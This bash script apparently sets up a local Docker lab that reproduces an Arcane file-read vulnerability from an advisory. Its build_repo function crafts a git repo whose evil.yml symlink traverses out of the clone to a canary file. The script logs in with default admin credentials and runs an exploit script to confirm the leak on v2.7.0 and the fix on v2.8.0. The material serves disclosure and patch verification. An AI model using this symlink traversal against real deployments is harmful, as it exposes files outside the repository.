#!/usr/bin/env bash
# Local lab for GHSA-2jcq-885f-253p: starts Arcane in Docker, runs exploit.sh against it.
#   ./poc/build-poc.sh                              # v2.7.0: expect [+] LEAKED
#   ARCANE_IMAGE_TAG=v2.8.0 ./poc/build-poc.sh      # v2.8.0: expect the sync to fail
set -euo pipefail

HERE="$(cd "$(dirname "$0")" && pwd)"
TAG="${ARCANE_IMAGE_TAG:-v2.7.0}"
IMAGE="ghcr.io/getarcaneapp/arcane:$TAG"
NAME="arcane-poc-$TAG"
PORT="${ARCANE_PORT:-3553}"
GIT_PORT=9418
CANARY_PATH=/tmp/arcane-canary.txt
WORK="$(mktemp -d)"
DAEMON_PID=""

step() { printf '\n== Step %s: %s\n' "$1" "$2"; }
cleanup() {
  [ -n "$DAEMON_PID" ] && kill "$DAEMON_PID" 2>/dev/null || true
  docker rm -f "$NAME" >/dev/null 2>&1 || true
  rm -rf "$WORK"
}
trap cleanup EXIT

# build_repo BARE_PATH TARGET: bare repo with compose.yml and evil.yml, a relative symlink to TARGET.
build_repo() {
  local bare="$1" target="$2" tree="$WORK/tree"
  rm -rf "$tree" && mkdir -p "$tree" && git -C "$tree" init -q -b master
  printf 'services: {}\n' > "$tree/compose.yml"
  ln -s "$(printf '../%.0s' $(seq 1 12))${target#/}" "$tree/evil.yml"
  git -C "$tree" add -A
  GIT_AUTHOR_NAME=poc GIT_AUTHOR_EMAIL=poc@example.invalid \
  GIT_COMMITTER_NAME=poc GIT_COMMITTER_EMAIL=poc@example.invalid \
    git -C "$tree" commit -q -m "compose + gitops config"
  mkdir -p "$(dirname "$bare")"
  git clone -q --bare "$tree" "$bare"
}

step 1 "Start Arcane $TAG"
docker rm -f "$NAME" >/dev/null 2>&1 || true
docker pull -q "$IMAGE" >/dev/null
docker run -d --name "$NAME" --network host \
  -e PORT="$PORT" \
  -e ENCRYPTION_KEY=0123456789abcdef0123456789abcdef \
  -e JWT_SECRET=poc-lab-secret-change-me-0123456789 \
  "$IMAGE" >/dev/null
for _ in $(seq 1 60); do curl -fsS "http://127.0.0.1:$PORT/api/health" >/dev/null 2>&1 && break; sleep 1; done
curl -fsS "http://127.0.0.1:$PORT/api/app-version" | python3 -c \
  'import sys,json;print("Arcane version:", json.load(sys.stdin)["currentVersion"])'

step 2 "Create the canary inside the container"
printf 'services: {}\n# CANARY: outside the cloned repo (%s)\n' "$(date -u +%FT%TZ)" > "$WORK/canary.txt"
docker cp "$WORK/canary.txt" "$NAME:$CANARY_PATH"

step 3 "Build the repo with the symlink to the canary"
build_repo "$WORK/srv/evil.git" "$CANARY_PATH"
echo "Tree entry: $(git --git-dir="$WORK/srv/evil.git" ls-tree master evil.yml)"

step 4 "Serve the repo over git:// on loopback"
git daemon --reuseaddr --listen=127.0.0.1 --port="$GIT_PORT" \
  --base-path="$WORK/srv" --export-all --enable=upload-pack >"$WORK/daemon.log" 2>&1 &
DAEMON_PID=$!
sleep 1

step 5 "Log in and get a token"
TOKEN=$(curl -fsS -X POST -H 'Content-Type: application/json' \
  -d '{"username":"arcane","password":"arcane-admin"}' \
  "http://127.0.0.1:$PORT/api/auth/login" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["data"]["token"])')

step 6 "Run exploit.sh"
set +e
ARCANE_URL="http://127.0.0.1:$PORT" ARCANE_TOKEN="$TOKEN" I_HAVE_AUTHORIZATION=yes \
  "$HERE/../exploit.sh" "git://127.0.0.1:$GIT_PORT/evil.git"
RESULT=$?
set -e

step 7 "Clean up"
exit "$RESULT"
